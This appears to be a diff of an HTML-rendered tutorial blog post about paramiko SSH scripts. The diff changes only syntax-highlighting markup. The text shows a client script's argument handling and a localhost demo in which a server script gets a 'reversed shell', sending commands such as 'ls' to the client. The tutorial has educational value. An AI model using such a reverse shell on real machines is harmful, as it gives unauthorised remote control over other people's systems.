+    <span class="k">print</span> <span class="s">&quot;Examples:&quot;</span>
+    <span class="k">print</span> <span class="s">&quot;ssh_client.py localhost -u buffy -p 22 -a killvampires&quot;</span>
     <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">ssh_client</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="p">):</span>
@@ -380,76 +380,76 @@
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
     <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">:]):</span>
         <span class="n">usage</span><span class="p">()</span>
-    <span class="n">IP</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
-    <span class="n">USER</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-    <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">IP</span> <span class="o">=</span> <span class="s">&#39;0.0.0.0&#39;</span>
+    <span class="n">USER</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+    <span class="n">PASSWORD</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
     <span class="n">PORT</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">opts</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="s2">&quot;p:u:a:&quot;</span><span class="p">,</span> \
-            <span class="p">[</span><span class="s2">&quot;PORT&quot;</span><span class="p">,</span> <span class="s2">&quot;USER&quot;</span><span class="p">,</span> <span class="s2">&quot;PASSWORD&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">opts</span> <span class="o">=</span> <span class="n">getopt</span><span class="o">.</span><span class="n">getopt</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span><span class="s">&quot;p:u:a:&quot;</span><span class="p">,</span> \
+            <span class="p">[</span><span class="s">&quot;PORT&quot;</span><span class="p">,</span> <span class="s">&quot;USER&quot;</span><span class="p">,</span> <span class="s">&quot;PASSWORD&quot;</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
     <span class="k">except</span> <span class="n">getopt</span><span class="o">.</span><span class="n">GetoptError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
         <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
         <span class="n">usage</span><span class="p">()</span>
     <span class="n">IP</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-    <span class="k">print</span> <span class="s2">&quot;[*] Initializing connection to &quot;</span> <span class="o">+</span> <span class="n">IP</span>
+    <span class="k">print</span> <span class="s">&quot;[*] Initializing connection to &quot;</span> <span class="o">+</span> <span class="n">IP</span>
     <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">opts</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-a&#39;</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-a&#39;</span><span class="p">):</span>
             <span class="n">PASSWORD</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-p&#39;</span><span class="p">):</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-p&#39;</span><span class="p">):</span>
             <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s1">&#39;-u&#39;</span><span class="p">):</span>
+        <span class="k">elif</span> <span class="n">t</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="s">&#39;-u&#39;</span><span class="p">):</span>
             <span class="n">USER</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="k">print</span> <span class="s2">&quot;This option does not exist!&quot;</span>
+            <span class="k">print</span> <span class="s">&quot;This option does not exist!&quot;</span>
             <span class="n">usage</span><span class="p">()</span>
     <span class="k">if</span> <span class="n">USER</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] User set to &quot;</span> <span class="o">+</span> <span class="n">USER</span>
+        <span class="k">print</span> <span class="s">&quot;[*] User set to &quot;</span> <span class="o">+</span> <span class="n">USER</span>
     <span class="k">if</span> <span class="n">PORT</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] The port to be used is </span><span class="si">%d</span><span class="s2">. &quot;</span> <span class="o">%</span> <span class="n">PORT</span>
+        <span class="k">print</span> <span class="s">&quot;[*] The port to be used is </span><span class="si">%d</span><span class="s">. &quot;</span> <span class="o">%</span> <span class="n">PORT</span>
     <span class="k">if</span> <span class="n">PASSWORD</span><span class="p">:</span>
-        <span class="k">print</span> <span class="s2">&quot;[*] A password with length </span><span class="si">%d</span><span class="s2"> was submitted. &quot;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">&quot;[*] A password with length </span><span class="si">%d</span><span class="s"> was submitted. &quot;</span> <span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">)</span>
     <span class="n">ssh_client</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">USER</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">)</span>
 
-<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
     <span class="n">main</span><span class="p">()</span>
 </pre></div>
 
 
 <h3>Running both Scripts</h3>
 <p>Let's run each script in a different terminal. First, the server:</p>
-<div class="highlight"><pre><span></span>$ ssh_server.py localhost <span class="m">22</span>
-<span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> connection ...
+<div class="highlight"><pre><span class="nv">$ </span>ssh_server.py localhost 22
+<span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for </span>connection ...
 </pre></div>
 
 
 <p>Then the client:</p>
-<div class="highlight"><pre><span></span>$ ssh_client_reverse.py localhost -p <span class="m">22</span> -u buffy -a killvampires
+<div class="highlight"><pre><span class="nv">$ </span>ssh_client_reverse.py localhost -p 22 -u buffy -a killvampires
 <span class="o">[</span>*<span class="o">]</span> Initializing connection to localhost
-<span class="o">[</span>*<span class="o">]</span> User <span class="nb">set</span> to buffy
-<span class="o">[</span>*<span class="o">]</span> The port to be used is <span class="m">22</span>.
-<span class="o">[</span>*<span class="o">]</span> A password with length <span class="m">12</span> was submitted.
+<span class="o">[</span>*<span class="o">]</span> User <span class="nb">set </span>to buffy
+<span class="o">[</span>*<span class="o">]</span> The port to be used is 22.
+<span class="o">[</span>*<span class="o">]</span> A password with length 12 was submitted.
 Welcome to Buffy<span class="err">&#39;</span>s SSH
 </pre></div>
 
 
 <p>Now we can send any command from the server side to run  in the client: we have a reversed shell!</p>
-<div class="highlight"><pre><span></span><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> connection ...
+<div class="highlight"><pre><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for </span>connection ...
 <span class="o">[</span>+<span class="o">]</span> Connection Established!
 <span class="o">[</span>+<span class="o">]</span> Authenticated!
-Enter command: ls
+Enter <span class="nb">command</span>: ls
 filename.log
 ssh_client.py
 ssh_client_reverse.py
 ssh_server.py
 test_rsa.key
 
-Enter command:
+Enter <span class="nb">command</span>:
 </pre></div>
 
 
 <p><strong>Awesomesauce!</strong></p>
 <p>Ah, by the way, all these scripts work not only in Linux but in Windows and Mac as well (so next time you are in a lame Windows machine, no need to install <a href="http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html">Putty</a> anymore =p ).</p>
-<hr>
+<hr />
 <h2>Further References:</h2>
 <ul>
 <li><a href="https://github.com/paramiko/paramiko/blob/master/demos/rforward.py">Paramikos reverse SSH tunneling</a>.</li>
